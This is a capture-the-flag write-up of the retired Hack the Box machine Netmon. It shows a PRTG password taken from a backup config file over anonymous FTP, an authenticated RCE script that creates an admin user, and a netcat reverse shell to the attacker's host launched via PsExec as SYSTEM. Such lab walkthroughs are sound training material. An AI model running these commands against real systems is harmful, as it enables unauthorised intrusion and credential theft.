---
layout: post
title: Hack the Box - Netmon
date: 2020-04-05 17:02:22 +0100
description: Netmon is an easy difficulty Windows box with simple enumeration and exploitation. PRTG is running,and an FTP server with anonymous access allows reading of PRTG Network Monitor configuration files. The version of PRTG is vulnerable to RCE which can be exploited to gain a SYSTEM shell.
img: netmon.png
fig-caption: Netmon
categories: HackTheBox
tags: [Easy, Windows, Retired, CVE]
---
## Overview
Netmon is an easy difficulty Windows box with simple enumeration and exploitation. PRTG is running,and an FTP server with anonymous access allows reading of PRTG Network Monitor configuration files. The version of PRTG is vulnerable to RCE which can be exploited to gain a SYSTEM shell.
## Enumeration
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/jerry]
└─$ sudo nmap -p- -T4  10.129.113.107  
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-14 18:15 GMT
Nmap scan report for 10.129.113.107
Host is up (0.017s latency).
Not shown: 65522 closed ports
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
```
From the initial scan the ports that seem of immediate interest are 21 and 80. When attempting to connect to the FTP server, anonymous access is allowed and gives user access to the filesystem.
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/jerry]
└─$ ftp 10.129.113.107
Connected to 10.129.113.107.
220 Microsoft FTP Service
Name (10.129.113.107:calxus): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  12:18AM                 1024 .rnd
02-25-19  10:15PM       <DIR>          inetpub
07-16-16  09:18AM       <DIR>          PerfLogs
02-25-19  10:56PM       <DIR>          Program Files
02-03-19  12:28AM       <DIR>          Program Files (x86)
02-03-19  08:08AM       <DIR>          Users
02-25-19  11:49PM       <DIR>          Windows
226 Transfer complete.
```
When accessing the web server located on port 80 we find a login page for PRTG Network monitor.
## Foothold
While googling for the location of credentials I found a reddit thread on the subject here: https://www.reddit.com/r/sysadmin/comments/835dai/prtg_exposes_domain_accounts_and_passwords_in/ So with access to the file system via FTP I was able to navigate to the directory "C:\ProgramData\Paessler\PRTG Network Monitor". From here there were three configuration files that I copied down and within "PRTG Configuration.old.bak" I was able to see the password.
```
<dbpassword>
	<!-- User: prtgadmin -->
	PrTg@dmin2018
</dbpassword>
```
Frustratingly the password didn't work, but as passwords are often only changed by 1 number I tried with 2019 and was able to get in. Searching exploitdb for RCE exploits I could find a script as shown below.
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/jerry]
└─$ searchsploit prtg
------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                           |  Path
------------------------------------------------------------------------- ---------------------------------
PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution     | windows/webapps/46527.sh
PRTG Network Monitor 20.4.63.1412 - 'maps' Stored XSS                    | windows/webapps/49156.txt
PRTG Network Monitor < 18.1.39.1648 - Stack Overflow (Denial of Service) | windows_x86/dos/44500.py
PRTG Traffic Grapher 6.2.1 - 'url' Cross-Site Scripting                  | java/webapps/34108.txt
------------------------------------------------------------------------- ---------------------------------
```
Using this a user can be created on the box by grabbing the cookies from the authenticated session to the site
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/jerry]
└─$ ./prtg.sh -u http://10.129.113.107 -c "_ga=GA1.4.1726106620.1615746366; _gid=GA1.4.190225335.1615746366; OCTOPUS1813713946=ezdFQ0RERUNFLTFCQjYtNEI3MC1BMUVDLTI1MzgxMUU1MTM4Q30%3D; _gat=1"
...
 [*] exploit completed new user 'pentest' with password 'P3nT3st!' created have fun!
```
Once that has completed we can connect to the instance using "evil-winrm"
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/jerry]
└─$ evil-winrm -u 'pentest' -p 'P3nT3st!' -i 10.129.113.107

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

PS C:\Users\pentest\Documents> whoami
netmon\pentest
```
## Privilege Escalation
Although we have an administrator user and this is enough to view the flags we can go a step further and gain system. To do this we copy over netcat and PsExec to the box using smb. 
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/jerry]
└─$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```
```
PS C:\Users\pentest\Documents> copy \\10.10.14.27\kali\PsExec.exe .
PS C:\Users\pentest\Documents> copy \\10.10.14.27\kali\nc.exe .
PS C:\Users\pentest\Documents> PsExec.exe -accepteula
PS C:\Users\pentest\Documents> .\PsExec.exe -i -s C:\Users\pentest\Documents\nc.exe -nv 10.10.14.27 4433 -e cmd.exe
```
After transferring the files and setting up the listener we can run the following command and be greeted with a system shell
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/jerry]
└─$ nc -nlvp 4433                                                                                                        130 ⨯
listening on [any] 4433 ...
connect to [10.10.14.27] from (UNKNOWN) [10.129.113.107] 50475
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```